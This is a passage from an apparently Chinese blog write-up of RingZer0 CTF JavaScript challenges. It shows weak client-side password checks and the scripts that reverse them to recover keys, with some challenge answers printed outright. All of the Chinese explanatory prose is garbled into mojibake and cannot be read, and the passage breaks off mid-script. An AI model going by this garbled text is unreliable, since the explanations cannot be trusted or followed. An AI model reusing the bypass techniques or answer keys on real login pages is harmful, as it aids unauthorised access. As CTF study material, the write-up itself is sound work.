class="string">"="</span> + _part.slice(<span class="number">1</span>,<span class="number">3</span>) + <span class="string">"+"</span> + (fn(<span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> y&lt;=<span class="number">57</span>&#125;)(_part.charCodeAt(<span class="number">0</span>)) ?  _part[<span class="number">0</span>] : <span class="string">"'"</span>+ _part[<span class="number">0</span>] + <span class="string">"'"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å¼€å§‹éš¾åº¦å°±ä¸Šå‡äº†ã€‚æˆ‘ä»¬å…ˆæ…¢æ…¢å®¡è®¡ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validatekey</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> _strKey = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _strKey = <span class="built_in">document</span>.getElementById(<span class="string">"key"</span>).value;</span><br><span class="line">        <span class="keyword">var</span> a = _strKey.split(<span class="string">"-"</span>);</span><br><span class="line">        <span class="keyword">if</span>(a.length !== <span class="number">5</span>)</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> o=a.map(genFunc).reduceRight(callback, <span class="keyword">new</span> (genFunc(a[<span class="number">4</span>]))(<span class="built_in">Function</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!equal(o,ref))</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        e = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + _strKey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå–äº†é¡µé¢ä¸­keyå€¼ï¼ˆå³è¾“å…¥ï¼‰è¿›è¡Œä¸€ç³»åˆ—åˆ¤æ–­ã€‚åªæœ‰eä¸ºfalseæ—¶æˆ‘ä»¬æ‰èƒ½è¿›å…¥<code>document.location = document.location.href + &quot;?p=&quot; + _strKey;</code> æ³¨æ„åˆ°å…¶ä¸­ä¸»è¦è¦æ±‚æ˜¯<code>var a = _strKey.split(&quot;-&quot;);        if(a.length !== 5)......</code> æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ ¼å¼ä¸º<code>xxx-xxx-xxx-xxx-xxx</code>çš„key.</p><p>æ¥ä¸‹æ¥çœ‹å…¶ä»–å‡½æ•°ã€‚è¿™é‡Œçš„<code>curry()</code>æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„jsæŸ¯é‡ŒåŒ–çš„å‡½æ•°( ä¸ºä»€ä¹ˆä¸æ˜¯åº“é‡Œ233) ã€‚å¸¸ç”¨äºå¤šå‚å‡½æ•°å¤ç”¨å¹¶ä¸”ä¸callbackç›¸ç»“åˆã€‚ä¸è¿‡æˆ‘ä»¬ä¸å¿…æ·±ç©¶,å…ˆæ¥çœ‹é€»è¾‘ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> h = curry(hook);</span><br><span class="line"><span class="keyword">var</span> fn = h(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;<span class="keyword">return</span> x &gt;= <span class="number">48</span>;&#125;,<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"return a &amp;&amp; b;"</span>));</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯è¿™é‡Œã€‚å‡ºç°äº†ä¸€ä¸ª<code>x&gt;=48</code>ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“xå‚æ•°ä»å“ªé‡Œæ¥ã€‚æ‰€ä»¥ç»§ç»­å‘ä¸‹çœ‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(_part.substring(<span class="number">1</span>,<span class="number">3</span>), <span class="string">"this."</span> + _part[<span class="number">3</span>] + <span class="string">"="</span> + _part.slice(<span class="number">1</span>,<span class="number">3</span>) + <span class="string">"+"</span> + (fn(<span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> y&lt;=<span class="number">57</span>&#125;)(_part.charCodeAt(<span class="number">0</span>)) ?  _part[<span class="number">0</span>] : <span class="string">"'"</span>+ _part[<span class="number">0</span>] + <span class="string">"'"</span>));</span><br></pre></td></tr></table></figure><p><code>(fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ?  _part[0] : &quot;&#39;&quot;+ _part[0] + &quot;&#39;&quot;)</code>è¿™ä¸€éƒ¨åˆ†è¯´æ˜å…¶è¿”å›çš„æ˜¯å‡½æ•°è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚çœ‹åˆ°è¿™ä¸ªIIFEçš„è°ƒç”¨ä»¥åŠå‰é¢æˆ‘ä»¬fnå‡½æ•°çš„æ„é€ ã€‚å¯ä»¥å¾—å‡ºï¼Œè¿™é‡Œå¯¹æˆ‘ä»¬è¾“å…¥çš„ç¬¬1ä¸ªå­—ç¬¦è¿›è¡Œäº†æ¯”è¾ƒï¼Œå…¶asciiå€¼åº”è¯¥åœ¨48åˆ°57ä¹‹é—´ï¼ˆå³æ•°å­—ï¼‰å°±ç›´æ¥å–æ•°å­—ï¼Œå¦åˆ™å°±åŠ ä¸Š<code>&#39;&#39;</code> ç®€å•çš„è°ƒç”¨ä¸‹æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ¥<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œè¿™ä¸ªæ•´ä½“æ˜¯ä¸<code>_part.substring(1,3)</code>ä½œä¸ºå‚æ•°è¢«é€è¿›æ„é€ å‡½æ•°çš„ã€‚å‘ç°ä»–æ˜¯åœ¨keyçš„æ£€æŸ¥é‡Œè¢«è°ƒç”¨äº†<code>var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));</code><br>æˆ‘ä»¬å›å¤´çœ‹ä¸‹callbackå‡½æ•°çš„å®šä¹‰ä»¥åŠreduceRightå‡½æ•°çš„åŠŸèƒ½</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">x,y,i,a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !y.call(x, a[a[<span class="string">"length"</span>]<span class="number">-1</span>-i].toString().slice(<span class="number">19</span>,<span class="number">21</span>)) ? x : &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reduceRight() æ–¹æ³•æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºç´¯åŠ å™¨ï¼ˆaccumulatorï¼‰å’Œæ•°ç»„çš„æ¯ä¸ªå€¼ï¼ˆä»å³åˆ°å·¦ï¼‰å°†å…¶å‡å°‘ä¸ºå•ä¸ªå€¼ã€‚</span><br></pre></td></tr></table></figure><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRight</a><br>å‚è€ƒä¸Šé¢çš„æ–‡æ¡£æˆ‘ä»¬çŸ¥é“ï¼Œcallbackä½œä¸ºå›è°ƒå‡½æ•°ï¼Œç”¨äºæ“ä½œæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„a[4]ç”Ÿæˆçš„å‡½æ•°æ˜¯æ•°ç»„æœ€å³çš„èµ·ç‚¹ã€‚ä¹‹åä¾æ¬¡å‘å·¦è¿›è¡Œå¤„ç†ã€‚</p><p>è¿™é‡Œæˆ‘å°½é‡ä½œå®Œæ•´çš„è§£é‡Šã€‚é¦–å…ˆcallbackä¸­<code>a[&quot;length&quot;]-1-i</code>å¯¹åº”çš„æ˜¯<code>a.length-1-i</code>å³<code>5-1-i</code>=<code>4-i</code>.ç„¶åcallbackå‡½æ•°çš„å››ä¸ªå‚æ•°åˆ†åˆ«å¯¹åº”äº†ç©ºmapï¼Œæ„é€ å‡½æ•°ï¼Œå åŠ å™¨çš„è¶Ÿæ•°ï¼Œä»¥åŠè¢«å¤„ç†è¿‡çš„è¾“å…¥aï¼ˆä»<code>xxxx-xxxx-xxxx-xxxx-xxxx</code> å˜æˆä¸€ä¸ª5å…ƒç´ çš„æ•°ç»„ï¼‰æˆ‘ä»¬ç®€å•è°ƒç”¨ä¸‹,ä¼šå‘ç°æœ€ç»ˆè¿”å›çš„ç»“æœä¸­æ¯ä¸ªæ•°ç»„å…ƒç´ çš„ç¬¬äºŒï¼Œä¸‰ä¸ªä¼šä¸å˜ï¼Œå¹¶å˜æˆæ–°çš„mapä¸­å¯¹åº”å€¼çš„ç¬¬ä¸€äºŒä½ã€‚ç„¶åå€¼çš„æœ€åä¸€ä½ä¼šå˜æˆåŸæ¥è¾“å…¥æ•°ç»„çš„é€†åºç¬¬ä¸€ä½çš„ç¬¬ä¸€ä¸ªå­—æ¯ã€‚è€Œæ•´ä¸ªè¿”å›çš„mapé”®åæ˜¯åŸè¾“å…¥æ•°ç»„é€†åºçš„æœ€åä¸€ä¸ªå­—æ¯ã€‚</p><p>å¤šè¯´æ— ç›Šã€‚æˆ‘ä»¬ç”¨ä¸€ä¸ªå››å…ƒç´ çš„æ•°ç»„æ¥çœ‹çœ‹è¿”å›ç»“æœ<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯ä»¥çœ‹åˆ°ï¼Œè¿”å›çš„mapè¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ é”®åæ¥è‡ªåŸæ¥æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ <code>mnop</code>çš„æœ€åä¸€ä¸ªå­—æ¯ã€‚å€¼éƒ¨åˆ†<code>bc</code>ä¿æŒä¸å˜ï¼Œæœ€åä¸€ä¸ªå­—æ¯åˆ™æ˜¯<code>mnop</code>çš„ç¬¬ä¸€ä¸ªå­—æ¯<code>m</code>.</p><p>æ—¢ç„¶æˆ‘ä»¬éœ€è¦æ»¡è¶³è¾“å…¥keyå¤„ç†åä¸º<code>{T : &quot;BG8&quot;,J : &quot;jep&quot;,j : &quot;M2L&quot;,K : &quot;L23&quot;,H : &quot;r1A&quot;};</code> å†™ä¸ªè„šæœ¬å¤„ç†ä¸‹å³å¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> src = <span class="string">'abcd-efgh-ijkl-mnop-qrst'</span>;</span><br><span class="line"><span class="keyword">var</span> dst = <span class="string">'tbcq-pfgm-ljki-hnoe-drsa'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="string">'TBG8-Jjep-jM2L-KL23-Hr1A'</span>;</span><br><span class="line"><span class="keyword">var</span> input = key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;src.length; i++) &#123;</span><br><span class="line">p = dst.indexOf(src[i]);</span><br><span class="line">tmp = input.split(<span class="string">''</span>);</span><br><span class="line">tmp[p] = key[i];</span><br><span class="line">input = tmp.join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(input);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°key<code>ABGH-3jeK-LM2j-pL2J-8r1T</code></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> t = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(u == <span class="string">"administrator"</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; u.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>((u.charCodeAt(i) + p.charCodeAt(i) + i * <span class="number">10</span>) != k[i]) &#123;</span><br><span class="line">                $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">                t = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">        t = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(t) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ç›¸æ¯”ä¸Šä¸€é¢˜ç®—æ˜¯å°èœäº†ã€‚ç”¨æˆ·è¾“å…¥å¯†ç çš„asciiä¼šä¸ç”¨æˆ·åadministratorè¿›è¡ŒåŠ æ³•è¿ç®—å¹¶ä¸å·²çŸ¥æ•°ç»„å€¼è¿›è¡Œæ¯”è¾ƒã€‚é‚£ä¹ˆé€†å†™å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">k = [<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>]</span><br><span class="line">u = [<span class="number">97</span>,<span class="number">100</span>,<span class="number">109</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">114</span>]</span><br><span class="line">p = &#123;&#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">"administrator"</span></span><br><span class="line">list1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s)):</span><br><span class="line">    p[i] = k[i] - u[i] - i*<span class="number">10</span></span><br><span class="line">    list1.append(p[i])</span><br><span class="line">    </span><br><span class="line">print(<span class="string">''</span>.join(chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> list1))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>OhLord4309111</code></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> k = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> func = <span class="string">"\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F"</span>;</span><br><span class="line">    buf = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (k.length == <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; func.length; i++) &#123;</span><br><span class="line">            c = <span class="built_in">parseInt</span>(func.charCodeAt(i));</span><br><span class="line">            c = c ^ k.charCodeAt(j);</span><br><span class="line">            <span class="keyword">if</span> (++j == k.length) &#123;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            buf += <span class="built_in">eval</span>(<span class="string">'"'</span> + a(x(c)) + <span class="string">'"'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">eval</span>(buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">h</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (h.length != <span class="number">2</span>) &#123;</span><br><span class="line">        h = <span class="string">"\x30"</span> + h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"\x5c\x78"</span> + h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        d = <span class="number">0xFFFFFFFF</span> + d + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d.toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»£ç æµç¨‹ä¹Ÿæ¯”è¾ƒå¤æ‚ã€‚ç®€å•æ¦‚æ‹¬å°±æ˜¯å»usernameä½œä¸ºè¾“å…¥ç„¶åæ¯9ä¸ªå­—ç¬¦ä¸æ‰€ç»™çš„funcè¿›è¡Œå¼‚æˆ–ã€‚æœ€åç»“æœä¼šè½¬hex.</p><p>è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“éœ€è¦çš„usernameæ˜æ–‡ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨<code>a^b=c =&gt; a^c=b</code>è¿™ç‚¹ï¼ŒçŒœæµ‹å¯†æ–‡ä¸­å¯èƒ½ä¼šå­˜åœ¨è·Ÿå‰é¢çš„å‡ºflagä¸€è‡´çš„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ç®€å•çˆ†ç ´ä¸‹usernameå¹¶è¿›è¡Œå†…å®¹ç­›é€‰ï¼Œæ‰¾å‡ºæœ‰documentå‡ºç°çš„ç»“æœ<br>è¿™é‡Œå€Ÿç”¨å¦ä¸€ä½å¸ˆå‚…çš„è„šæœ¬<a href="https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md" target="_blank" rel="noopener">https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="string">"\x2B\x09\x4A\x03\x49\x0F\x0E\x14\x15\x1A\x00\x10\x3F\x1A\x71\x5C\x5B\x5B\x00\x1A\x16\x38\x06\x46\x66\x5A\x55\x30\x0A\x03\x1D\x08\x50\x5F\x51\x15\x6B\x4F\x19\x56\x00\x54\x1B\x50\x58\x21\x1A\x0F\x13\x07\x46\x1D\x58\x58\x21\x0E\x16\x1F\x06\x5C\x1D\x5C\x45\x27\x09\x4C\x1F\x07\x56\x56\x4C\x78\x24\x47\x40\x49\x19\x0F\x11\x1D\x17\x7F\x52\x42\x5B\x58\x1B\x13\x4F\x17\x26\x00\x01\x03\x04\x57\x5D\x40\x19\x2E\x00\x01\x17\x1D\x5B\x5C\x5A\x17\x7F\x4F\x06\x19\x0A\x47\x5E\x51\x59\x36\x41\x0E\x19\x0A\x53\x47\x5D\x58\x2C\x41\x0A\x04\x0C\x54\x13\x1F\x17\x60\x50\x12\x4B\x4B\x12\x18\x14\x42\x79\x4F\x1F\x56\x14\x12\x56\x58\x44\x27\x4F\x19\x56\x49\x16\x1B\x16\x14\x21\x1D\x07\x05\x19\x5D\x5D\x47\x52\x60\x46\x4C\x1E\x1D\x5F\x5F\x1C\x15\x7E\x0B\x0B\x00\x49\x51\x5F\x55\x44\x31\x52\x45\x13\x1B\x40\x5C\x46\x10\x7C\x38\x10\x19\x07\x55\x13\x44\x56\x31\x1C\x15\x19\x1B\x56\x13\x47\x58\x30\x1D\x1B\x58\x55\x1D\x57\x5D\x41\x7C\x4D\x4B\x4D\x49\x4F"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor</span>(<span class="params">ori_chr, dst_chr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(ori_chr.charCodeAt() ^ dst_chr.charCodeAt());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; func.length; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        buffer += xor(key[i % <span class="number">9</span>], func[i])</span><br><span class="line">    